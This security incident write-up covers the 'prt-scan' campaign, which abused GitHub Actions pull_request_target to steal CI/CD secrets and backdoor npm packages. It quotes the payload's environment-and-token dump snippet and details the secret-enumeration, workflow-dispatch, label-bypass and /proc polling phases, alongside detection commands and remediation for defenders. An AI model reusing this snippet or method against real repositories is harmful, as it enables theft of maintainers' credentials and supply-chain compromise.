# prt-scan — AI-Augmented GitHub Actions Credential Theft Campaign

**Date:** April 2026 (campaign began March 2026)
**Ecosystem:** GitHub Actions / npm
**Severity:** High
**Type:** pull_request_target exploitation / CI secret theft / npm compromise
**Sources:**
- [SafeDep — prt-scan: A 5-Phase GitHub Actions Credential Theft Campaign](https://safedep.io/prt-scan-github-actions-exfiltration-campaign/)
- [Wiz Research — Six Accounts, One Actor: Inside the prt-scan Supply Chain Campaign](https://www.wiz.io/blog/six-accounts-one-actor-inside-the-prt-scan-supply-chain-campaign)

---

## Summary

Beginning March 11, 2026, a threat actor executed a sustained, AI-augmented campaign exploiting GitHub's `pull_request_target` workflow trigger to steal CI/CD secrets from open-source repositories at scale. The campaign operated across six successive attacker accounts, all sharing Proton Mail addresses with the same base identity (`testedbefore@proton.me`, `elzotebo@proton.me`), before culminating in the publicly disclosed `ezmtebo` wave on April 2–3, 2026, during which over 475 malicious pull requests were opened in 26 hours. Across all six waves, more than 500 PRs were submitted against targets spanning AWS, SAP, Palo Alto Networks, Red Hat, Svelte, and hundreds of smaller projects.

The campaign is notable for its evolution toward AI-assisted payload generation. Later waves produced idiomatic, repository-aware injection files — Go test files for Go repos, `conftest.py` for Python/pytest projects, `package.json` script hooks for Node.js — adapted at machine speed to each target's tech stack. Despite elaborate five-phase payloads, the attacker demonstrated a fundamental misunderstanding of GitHub's permission model, limiting the overall success rate to under 10% of attempts. However, across 500+ attempts that still represents dozens of confirmed compromises, including AWS keys, Cloudflare API tokens, Netlify auth tokens, and two npm packages successfully backdoored.

The campaign is a direct successor to `hackerbot-claw` (Feb 2026) and marks a new phase in supply chain threats: agentic automation that can fork, analyze, inject, and submit at machine speed with no manual orchestration.

---

## Compromised Artifacts

| Package / Repository | Impact |
|----------------------|--------|
| `@codfish/eslint-config` | Malicious versions published via stolen NPM_TOKEN (106 versions) |
| `@codfish/actions` | Malicious versions published via stolen NPM_TOKEN (106 versions) |
| `darlal/obsidian-switcher-plus` | CI executed with GITHUB_TOKEN + DIFF_ACTION_TOKEN exposed |
| AWS, Cloudflare, Netlify repos | Ephemeral credentials stolen in confirmed CI runs |

---

## How It Worked

### Campaign Structure: Six Waves

| Account | Period | PRs | Key Evolution |
|---------|--------|-----|---------------|
| `testedbefore` | Mar 11–13 | ~10 | Crude `setup.py`/Makefile injections; RECON/DISPATCH pattern established |
| `beforetested-boop` | Mar 13–16 | ~47 | Scale-up; `package.json` + Makefile variants |
| `420tb` | Mar 28 | ~11 | Payload polishing; refined 351-line bash script |
| `69tf420` | Mar 28–29 | similar | Consistent raw `.github/prt_exfil.sh` delivery |
| `elzotebo` | Apr 2 | ~13 | "Smart" file placement; AI-hallucinated files (`pip.py`) |
| `ezmtebo` | Apr 2–3 | 475+ | Full AI-generated, repository-aware payloads; 5 variants |

### The Core Exploit: pull_request_target

The attack exploits `pull_request_target`, a GitHub Actions trigger that runs in the context of the **base repository** (not the fork), granting access to repository secrets even for external contributor PRs. The attacker's flow:

1. Search GitHub for repos using `pull_request_target` in workflows
2. Fork the target repository
3. Create a branch named `prt-scan-{12-hex-chars}`
4. Inject a malicious payload into a file that triggers during CI
5. Open a PR titled `ci: update build configuration`
6. When the workflow executes: steal `GITHUB_TOKEN`, enumerate secrets, exfiltrate credentials

### Five-Phase Payload

The primary payload (`.github/prt_exfil.sh`, 352 lines) executes in five phases:

**Phase 1 — EXFIL:** Immediately dumps environment variables and the git HTTP extraheader (which contains `GITHUB_TOKEN` as base64 Basic auth) to the CI log between unique markers:
```bash
echo "==PRT_EXFIL_START_${NONCE}=="
(env; echo "PRT_GIT_AUTH=$(git config --get-all \
  http.https://github.com/.extraheader 2>/dev/null || true)") \
  | gzip -c | base64
echo "==PRT_EXFIL_END_${NONCE}=="
```

**Phase 2 — RECON:** Uses the stolen token to enumerate secret *names* (not values) via GitHub API, list deployment environments, scan workflow YAMLs for `secrets.XXX` references, and probe cloud metadata endpoints for SSRF (AWS `169.254.169.254`, Azure, GCP `metadata.google.internal`).

**Phase 3 — DISPATCH:** If the token has `contents:write + actions:write`, creates a temporary workflow file on the default branch that maps every discovered secret name into its `env:` block, then dispatches it to capture actual secret *values*. This is the critical escalation: Phase 2 only sees names; Phase 3 sees values.

**Phase 4 — LABEL BYPASS:** Parses workflow YAMLs for label-gated conditions (e.g., `safe to test`), then creates and applies the required label to the attacker's own PR via API — designed to defeat projects that use label-gating as a `pull_request_target` defense.

**Phase 5 — DELAYED DAEMON:** Launches a background Python process that polls `/proc/*/environ` every 2 seconds for 10 minutes, looking for new environment variables matching 22 high-value keywords (`NETLIFY`, `AWS_SECRET`, `NPM_TOKEN`, `CLOUDFLARE`, `OPENAI`, `ANTHROPIC`, etc.). Catches secrets loaded by later CI steps after the main script exits; exfiltrates via PR comments (which survive log deletion).

### Payload Variants by Ecosystem

| Variant | Delivery | Trigger | Detection Difficulty |
|---------|---------|---------|---------------------|
| Shell script | `.github/prt_exfil.sh` | Workflow execution | Low |
| Composite action | `action.yml` (base64 blobs) | Action step | Medium |
| npm hooks | Modified `package.json` scripts | `npm install` | High |
| Python setup | `setup.py` | `pip install` | Medium |
| pytest conftest | `conftest.py` (double base64) | `pytest` auto-loads | High |

The `conftest.py` variant is especially dangerous: pytest auto-loads it before any test execution — no explicit import required. The AWS SageMaker Core repo (`aws/sagemaker-core`) was targeted with this variant.

### No External C2

By design, the attack never contacts an attacker-controlled server. All exfiltration routes through GitHub itself: CI build log stdout (between unique markers), PR comments, and dispatched workflow run logs. This makes network-based detection impossible — all traffic goes to `api.github.com` or link-local cloud metadata IPs.

### npm Compromise Confirmed

In at least one case, the attacker captured an `NPM_TOKEN` and used it to publish 106 malicious versions of `@codfish/eslint-config` and `@codfish/actions`.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| 2026-03-11 ~08:00 | `testedbefore` account opens first PRs; `prt-scan-` branch pattern established |
| 2026-03-13 | `beforetested-boop` continues campaign; 47 PRs across larger projects |
| 2026-03-28 | `420tb` and `69tf420` accounts polish payload; 22 PRs in 2 hours |
| 2026-04-02 20:59 | `ezmtebo` account created |
| 2026-04-02 21:01 | First malicious PR opened by `ezmtebo` — 2 minutes after account creation |
| 2026-04-02–03 | 475+ PRs submitted in 26 hours; AI-generated language-aware payloads |
| 2026-04-03 | SafeDep publishes campaign analysis; GitHub Trust & Safety begins account removal |
| 2026-04-04 | Wiz Research publishes six-wave attribution analysis |

---

## Detection

```bash
# Search your GitHub org for PRs from known attacker accounts
# (via GitHub search UI or API)
# https://github.com/search?q=author%3Aezmtebo+is%3Apr&type=pullrequests

# Check for injected payload files in your repo
git log --all --full-history -- ".github/prt_exfil.sh" ".github/workflows/.prt_tmp_*.yml"

# Search for the campaign's payload markers in workflow run logs
# (use GitHub Actions log search or CI log archiving)
grep -r "PRT_EXFIL_START\|PRT_RECON_START\|PRT_HARVEST_START\|PRT_DELAYED_START" /path/to/ci-logs/

# Check for temporary workflow files left on the default branch (Phase 3)
git ls-files ".github/workflows/.prt_tmp_*.yml"

# Check for malicious branch names (hex suffix pattern)
git branch -r | grep "prt-scan-"

# For npm: check published versions around the attack window for packages
# where CI has NPM_TOKEN access
npm view @codfish/eslint-config versions --json | grep "0.0.0-PR-"

# Scan for label bypass indicators in GitHub API audit logs
# Look for label creation events by fork-PR authors on your repos
```

---

## Remediation

1. **Rotate all CI/CD secrets** if your repo received a PR from `ezmtebo` or any `prt-scan-*` branch and CI executed against it. Assume GITHUB_TOKEN, NPM_TOKEN, AWS keys, Cloudflare tokens, and any other secret in the workflow environment are compromised.
2. **Scan workflow run logs** for `PRT_EXFIL_START`, `PRT_RECON_START`, `PRT_HARVEST_START` markers — presence confirms credentials were exfiltrated to CI logs.
3. **Search default branch** for `.prt_tmp_*.yml` files in `.github/workflows/` (Phase 3 injection artifacts).
4. **Harden `pull_request_target` workflows:** The safest pattern runs fork PR workflows in a restricted context with no secrets access, using a separate privileged workflow triggered by explicit maintainer approval:
   ```yaml
   on:
     pull_request_target:
       types: [opened, synchronize]
   jobs:
     test:
       # Do NOT checkout PR head here
       # Do NOT pass secrets to fork-originated workflows
   ```
5. **Require first-time contributor approval** in GitHub org/repo settings (Settings → Actions → Fork pull request workflows). This is the most effective single control.
6. **Audit `pull_request_target` workflows** to ensure they never use `ref: ${{ github.event.pull_request.head.sha }}` — the pattern that allowed execution in `darlal/obsidian-switcher-plus`.
7. **Report accounts** matching `testedbefore`, `beforetested-boop`, `420tb`, `69tf420`, `elzotebo`, `ezmtebo` to GitHub Trust & Safety.

---

## Lessons Learned

- **AI is lowering the bar for large-scale supply chain attacks:** Adaptive, language-aware payloads that previously required expert manual crafting can now be generated at machine speed for hundreds of targets simultaneously.
- **`pull_request_target` + head checkout remains the most exploited GitHub misconfiguration:** Label-gating alone is not a defense — when the attacker's token can create and apply labels, the gate becomes circular.
- **No external C2 is the new stealthy standard:** Routing all exfiltration through `api.github.com` defeats network-level detection entirely. The only reliable detection is log analysis and pre-merge PR inspection.
- **AI-powered review bots outperformed traditional SAST:** CodeRabbit, Sourcery, and Qodo all flagged the malicious PRs; Codacy and the `gstraccini` bot auto-approved. This is a signal for orgs to invest in AI-assisted code review for security.
- **Volume compensates for low success rate:** At <10% success across 500+ attempts, the attacker still achieved dozens of real compromises and confirmed npm package poisoning.

---

## Related Incidents

- [./2026-02-hackerbot-claw.md](./2026-02-hackerbot-claw.md) — Prior AI-powered CI/CD attack campaign; same `pull_request_target` exploitation vector
- [./2026-03-kubernetes-el.md](./2026-03-kubernetes-el.md) — Pwn Request via `pull_request_target` exploiting GITHUB_TOKEN
- [./2026-03-trivy-github-actions.md](./2026-03-trivy-github-actions.md) — CI/CD secret theft via poisoned GitHub Actions tags
- [./2026-03-checkmarx-kics-action.md](./2026-03-checkmarx-kics-action.md) — GitHub Actions compromise via stolen maintainer credentials
